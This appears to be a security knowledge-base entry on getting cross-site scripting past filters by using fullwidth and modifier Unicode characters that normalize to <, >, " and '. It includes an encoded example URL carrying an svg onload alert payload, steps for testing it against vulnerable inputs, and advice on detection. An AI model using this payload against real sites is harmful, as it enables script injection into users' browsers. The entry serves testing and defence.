---
type: code
language: javascript
verified: true
tags:
  - xss
  - unicode-bypass
  - transformation
platforms:
  - web-applications
  - javascript
validated: true
---

# fullwidth-to-ascii-unicode-transformations

## Code

```javascript
Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was transformed into U+003C LESS­THAN SIGN (<)

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK ("))

Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE ('))

E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
%EF%BC%9E becomes >
%EF%BC%9C becomes <
```

## Description

This code snippet documents key Unicode transformations used to convert fullwidth and modifier characters into standard ASCII symbols for XSS payloads. It illustrates how to encode <, >, ', and " to bypass filters that don't normalize Unicode, enabling injection of elements like <svg onload=alert()>

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| %EF%BC%9C | Encoding for fullwidth < (U+FF1C) | Used in payloads to become < |
| %CA%BA | Encoding for double quote variant (U+02BA) | Transforms to " |
| %CA%B9 | Encoding for single quote variant (U+02B9) | Transforms to ' |
| %EF%BC%9E | Encoding for fullwidth > (U+FF1E) | Used in payloads to become > |

## Usage

Incorporate these encodings into URL parameters or form data for XSS testing. For example, submit the 'E.g' URL to a vulnerable input to trigger the alert if the filter fails to block the normalized payload. Use in Burp Suite Repeater or browser console to craft and test.

## Detection

- Monitor for unusual URL encodings (%EF%BC, %CA%) in access logs.
- Implement Unicode normalization (NFKC) in input processing to collapse variants.
- WAF rules matching common transformation patterns like fullwidth characters.
- Browser dev tools showing decoded payloads during rendering.

## Related

- [[procedures/Unicode-Filter-Bypass-for-XSS]]
- [[commands/curl-test-unicode-xss-payload]]
